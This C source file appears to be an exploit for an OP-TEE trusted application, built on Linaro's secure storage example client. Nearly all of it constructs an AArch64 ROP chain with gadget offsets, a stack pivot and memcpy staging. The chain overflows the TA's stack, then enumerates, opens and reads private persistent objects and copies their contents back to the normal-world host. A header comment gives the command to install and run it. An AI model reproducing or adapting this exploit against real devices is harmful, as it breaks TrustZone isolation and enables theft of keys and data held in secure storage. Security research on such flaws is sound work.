/*
cp -v /mnt/a/b6c53aba-9669-4668-a7f2-205629d00f86.ta /lib/optee_armtz/ && /mnt/a/optee_example_secure_storage
*/

/*
 * Copyright (c) 2017, Linaro Limited
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>
// #include <tee_api_defines.h>
// #include <tee_api_defines_extensions.h>
#define TEE_STORAGE_PRIVATE 1

/* TA API: UUID and command IDs */
#include <secure_storage_ta.h>

/* TEE resources */
struct test_ctx {
    TEEC_Context ctx;
    TEEC_Session sess;
};

void prepare_tee_session(struct test_ctx *ctx)
{
    TEEC_UUID uuid = TA_SECURE_STORAGE_UUID;
    uint32_t origin;
    TEEC_Result res;

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx->ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    /* Open a session with the TA */
    res = TEEC_OpenSession(&ctx->ctx, &ctx->sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, origin);
}

void terminate_tee_session(struct test_ctx *ctx)
{
    TEEC_CloseSession(&ctx->sess);
    TEEC_FinalizeContext(&ctx->ctx);
}

static void trigger_ta_panic()
{
    TEEC_Result res;
    struct test_ctx ctx;
    printf("Prepare session with the TA\n");
    prepare_tee_session(&ctx);

    char obj_id[] = "aaaaaaaa";
    
    // Location of the contents of this buffer: stack_base + 0xec0
    uint8_t* content_buf = calloc(0x4000,1); // this control the size of param pages past stack
    strcpy((void*)content_buf, "this is my data");

    // 7-bits brute (&0x7f)
    uint64_t text_base  = 0x40014000;
    uint64_t stack_base = 0x40032000;

    // start of overflow, SP+0x70, triggered when leaving frame of parent (_utee_entry)
    uint64_t* p = (uint64_t*)(content_buf + 0x20);

    // Sp points to here when executing LDP X29, X30, [SP],#0x90
    // Sp = stack_base + 0xee0
    *(p+0) = 0x6969696969696969; // x29
    *(p+1) = text_base+0x20dc;   // next gadget
    p += 18; // +0x90

    // Sp points here when executing ldp x29, x30, [sp], #0x60 ; ret
    // Idea: skip some slots, those slots are smashed while exiting _utee_entry
    // Sp = stack_base + 0xF70
    *(p+0 ) = 0x6969696969696969; // x29 = new sp after pivot
    *(p+1 ) = text_base+0x13c0;   // next gadget
    p += 12; // +0x60

    // We will copy the entire ropchain up
    // Setup argument regs for TEE_MemMove

    // Sp points here when executing ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
    // Sp = stack_base + 0xfd0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x9e20  ; // next gadget
    *(p+2 ) = stack_base        ; // x19 -- can be any writeable address. used by memcpy gadget
    p += 4; // +0x20

    // Sp points here when executing ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x25, x26, [sp, #0x40] ; ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x60 ; ret
    // Sp = stack_base + 0xff0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x042c4 ; // next gadget
    *(p+4 ) = 0x1000            ; // x21 = next x2 = MemMove size
    *(p+5 ) = stack_base+0x1070 ; // x22 = next x1 = MemMove source = remainder of the ropchain after the stack pivot
    *(p+6 ) = stack_base        ; // x23 = next x0 = MemMove destination
    *(p+7 ) = 0x2424242424242424; // x24
    *(p+8 ) = 0x2525252525252525; // x25
    *(p+9 ) = 0x2626262626262626; // x26
    *(p+10) = text_base+0xB580  ; // x27 = jumped to by next gadget = call to memcpy
    *(p+11) = 0x2828282828282828; // x28
    p += 12; // +0x60

    // Sp points here when executing mov x2, x21 ; mov x1, x22 ; mov x0, x23 ; blr x27
    // BL memcpy ; ldr W0, [X19,#0x1C] ; tbz W0, #0x13, loc_B590 ; stp WZR, WZR, [X19,#0x14] ; ldp X19, X20, [SP,#var_s10] ; ldp X29, X30, [SP+var_s0],#0x20 ; ret
    // Sp = stack_base + 0x1050
    *(p+0 ) = stack_base        ; // x29 = new sp after pivot
    *(p+1 ) = text_base+0x20c8  ; // next gadget
    *(p+2 ) = 0x1919191919191919; // x19
    *(p+3 ) = 0x2020202020202020; // x20
    p += 4; // +0x20

    // Stack pivot
    // Sp points here when executing mov sp, x29 ; <-- PIVOT
    // mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x60 ; ret
    // Sp = stack_base + 0x1070 (pre-pivot)
    // Sp = stack_base + 0x0 (post-pivot)
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x1a64  ; // next gadget
    *(p+2 ) = 0x1919191919191919; // x19
    *(p+3 ) = 0                 ; // x20
    *(p+4 ) = 0x2121212121212121; // x21
    *(p+5 ) = 0x2222222222222222; // x22
    *(p+6 ) = 0x2323232323232323; // x23
    p += 12; // +0x60

    // Set up registers for TEE_AllocatePersistentObjectEnumerator
    // Sp points here when executing ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
    // Sp = stack_base + 0x60
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x25CC  ; // next gadget
    *(p+2 ) = 0x1a19191919191919; // x19
    *(p+3 ) = stack_base+0xe0   ; // x20 = pointer where objectEnumerator will be stored
    p += 4; // +0x20
    
    // Sp points here when executing the middle of TEE_OpenPersistentObject
    // Sp = stack_base + 0x80
    // ...
    // LDP X19, X20, [SP,#0x10] ; LDP X29, X30, [SP],#0x30 ; ret
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x9e20  ; // next gadget
    *(p+2 ) = 0x1919191919191919; // x19
    *(p+3 ) = 0x2020202020202020; // x20
    p += 6; // +0x30

    // Set up registers for TEE_AllocatePersistentObjectEnumerator
    // Sp points here when executing ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x25, x26, [sp, #0x40] ; ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x60 ; ret
    // Sp = stack_base + 0xb0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x042c4 ; // next gadget
    *(p+4 ) = 0x2121212121212121; // x21
    *(p+5 ) = 1                 ; // x22 = next x1 = TEE_STORAGE_PRIVATE
    *(p+6 ) = 0xaaaaaaaaaaaaaaaa; // x23 = next x0 <-- stack_base + 0xe0 = this will get overwritten with a TEE_ObjectEnumHandle by the previous gadget
    *(p+7 ) = 0x2424242424242424; // x24
    *(p+8 ) = 0x2525252525252525; // x25
    *(p+9 ) = 0x2626262626262626; // x26
    *(p+10) = text_base+0x2670  ; // x27 = jumped to by next gadget
    *(p+11) = 0x2828282828282828; // x28
    p += 12; // +0x60

    // Sp points here when executing the middle of TEE_StartPersistentObjectEnumerator
    // End with ldr X19, [SP,#0x20+var_10] ; ldp X29, X30, [SP+0x20+var_20],#0x20 ; ret
    // Sp = stack_base + 0x110
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x1a64  ; // next gadget
    *(p+2 ) = 0x1919191919191919; // x19
    p += 4; // +0x20
    // x23 = objectEnumerator is carried over

    // Set up registers for TEE_AllocatePersistentObjectEnumerator

    // 1a64 : ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
    // Sp = stack_base + 0x130
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x9e2c  ; // next gadget
    *(p+2 ) = 0                 ; // x19 = objectInfo out, optional. set it to 0
    *(p+3 ) = stack_base+0x268  ; // x20 = uint32_t *objectIDLen , this will get popped later into a register
    p += 4; // +0x20
    // x23 = objectEnumerator is carried over

    // Sp points here when executing 9e2c : ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x60 ; ret
    // Sp = stack_base + 0x150
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x2128  ; // next gadget
    *(p+10) = text_base+0x26C8  ; // x27 = jumped to by x0,x1,x2 loading gadget (middle of TEE_GetNextPersistentObject)
    *(p+11) = 0x2828282828282828; // x28
    p += 12; // +0x60
    // x23 = next x0 = objectEnumerator is carried over

    // Sp points here when executing 2128 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
    // Sp = stack_base + 0x1b0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x042c4 ; // next gadget (load x0,x1,x2 from x23,x22,x21; jump to x27)
    *(p+4 ) = stack_base+8      ; // x21 = next x2 = objectID out
    *(p+5 ) = 0                 ; // x22 = next x1 = objectInfo out, optional. set it to 0
    p += 6; // +0x30

    // Sp points here when executing middle of TEE_GetNextPersistentObject
    // ldp X19, X20, [SP,#0x60+var_50] ; ldp  X21, X22, [SP,#0x60+var_40] ; ldp  X29, X30, [SP+0x60+var_60],#0x60
    // Sp = stack_base + 0x1e0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x9e1c  ; // next gadget (load x0,x1,x2 from x23,x22,x21; jump to x27)
    p += 12; // +0x60

    // OK now read that shit

    // Set up registers for TEE_OpenPersistentObject
    // Sp points here when executing ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x25, x26, [sp, #0x40] ; ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x60 ; ret
    // Sp = stack_base + 0x240
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x2358  ; // next gadget
    *(p+2 ) = stack_base+8      ; // x19 = next x1 = objectID pointer
    *(p+3 ) = stack_base+0x2b0  ; // x20 = destination where object handle is stored = pointer to where x19 will be popped at the end of the next gadget
    *(p+4 ) = 1                 ; // x21 = next w0 = storageID = TEE_STORAGE_PRIVATE
    *(p+5 ) = 0x0000000000000000; // x22 = next w2 = objectIDLen = 13 <-- stack_base+0x268
    *(p+6 ) = 0x11              ; // x23 = next w3 = TEE_DATA_FLAG_ACCESS_READ | TEE_DATA_FLAG_SHARE_READ
    *(p+7 ) = 0x2424242424242424; // x24
    *(p+8 ) = 0x2525252525252525; // x25
    *(p+9 ) = 0x2626262626262626; // x26
    *(p+10) = 0x2727272727272727; // x27
    *(p+11) = 0x2828282828282828; // x28
    p += 12; // +0x60
    
    // Sp points here when executing the middle of TEE_OpenPersistentObject
    // function expects stack frame of size 0x50 bytes
    // MOV X1, X19 ; ADD X4, SP, #0x4C ; MOV W3, W23 ; MOV W2, W22 ; MOV W0, W21 ; BL syscall_storage_obj_open
    // write the object handle to [x20]
    // ... some more conditional logics ...
    // LDP X19, X20, [SP,#0x10] ; LDP X21, X22, [SP,#0x20] ; LDR X23, [SP,#0x30] ; LDP X29, X30, [SP],#0x50 ; RET
    // Sp = stack_base + 0x2a0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x02798 ; // next gadget
    *(p+2 ) = 0x1919191919191919; // x19 <-- stack_base + 0x2b0 = this will get overwritten with a TEE_ObjectHandle by the previous gadget
    *(p+3 ) = stack_base+0x360  ; // x20 = uint32_t *count
    *(p+4 ) = stack_base+8      ; // x21 = next x1 = void *buffer
    *(p+5 ) = 64                ; // x22 = next w2 = uint32_size
    *(p+6 ) = 0x2323232323232323; // x23
    p += 10; // +0x50

    // Sp points here when executing the middle of TEE_ReadObjectData
    // function expects stack frame of 0x40 bytes
    // ADD X3, SP, #0x38 ; MOV W2, W22 ; MOV X1, X21 ; STR X0, [SP,#0x38] ; MOV X0, X19 ; BL syscall_storage_obj_read ; 
    // write to [x20]
    // ... some more conditional logic ...
    // LDP X19, X20, [SP,#0x10] ; LDP X21, X22, [SP,#0x20] ; LDP X29, X30, [SP],#0x40
    // Sp = stack_base + 0x2f0
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x13c0  ; // next gadget
    *(p+2 ) = 0x1919191919191919; // x19
    *(p+3 ) = 0x0020202020202020; // x20
    *(p+4 ) = 0x2121212121212121; // x21
    *(p+5 ) = 0x2222222222222222; // x22
    p += 8; // +0x40

    // Copy out read contents to parameters, where they will be accessible from the host

    // Setup args for MemMove
    // Sp points here when executing ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
    // stack_base + 0x330
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x9e20  ; // next gadget
    *(p+2 ) = stack_base        ; // x19 -- can be any writeable address. used by memcpy gadget
    p += 4; // +0x20

    // Sp points here when executing ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x25, x26, [sp, #0x40] ; ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x60 ; ret
    // stack_base + 0x350
    *(p+0 ) = 0x6969696969696969; // x29
    *(p+1 ) = text_base+0x042c4 ; // next gadget
    *(p+4 ) = 50                ; // x21 = next x2 = MemMove size <-- stack_base + 0x360
    *(p+5 ) = stack_base+8      ; // x22 = next x1 = MemMove source = remainder of the ropchain after the stack pivot
    *(p+6 ) = stack_base+0x12b0 ; // x23 = next x0 = MemMove destination
    *(p+7 ) = 0x2424242424242424; // x24
    *(p+8 ) = 0x2525252525252525; // x25
    *(p+9 ) = 0x2626262626262626; // x26
    *(p+10) = text_base+0xB580  ; // x27 = jumped to by next gadget = call to memcpy
    *(p+11) = 0x2828282828282828; // x28
    p += 12; // +0x60

    // Sp points here when executing mov x2, x21 ; mov x1, x22 ; mov x0, x23 ; blr x27
    // BL memcpy ; ldr W0, [X19,#0x1C] ; tbz W0, #0x13, loc_B590 ; stp WZR, WZR, [X19,#0x14] ; ldp X19, X20, [SP,#var_s10] ; ldp X29, X30, [SP+var_s0],#0x20 ; ret
    *(p+0 ) = stack_base        ; // x29 = new sp after pivot
    *(p+1 ) = text_base+0x2D38  ; // next gadget (syscall_exit_return)
    *(p+2 ) = 0x1919191919191919; // x19
    *(p+3 ) = 0x2020202020202020; // x20
    p += 4; // +0x20

    // *p++ = text_base+0x2D38; // x30 =  syscall_sys_return 

    uint32_t org = 0;
    uint32_t cmd_id = 0;
    TEEC_Operation op = { };
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = obj_id;
    op.params[0].tmpref.size = sizeof(obj_id);
    op.params[1].tmpref.buffer = content_buf;
    op.params[1].tmpref.size = 0x4000;
    printf("0x%x\n", op.paramTypes);

    printf("Trigger bof\n");
    res = TEEC_InvokeCommand(&ctx.sess, cmd_id, &op, &org);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InvokeCommand failed: 0x%x\n", res);
        if (res == TEEC_ERROR_TARGET_DEAD)
            goto cleanup;
    }

    printf("Read back\n");
    for (size_t i = 0; i < 100; i++) { printf("%02x ", (uint8_t)content_buf[i]); }
    printf("\n");

cleanup:
    printf("We're done, close and release TEE resources\n");
    terminate_tee_session(&ctx);
}

int main(void)
{
    // violence2();
    trigger_ta_panic();
    return 0;
}
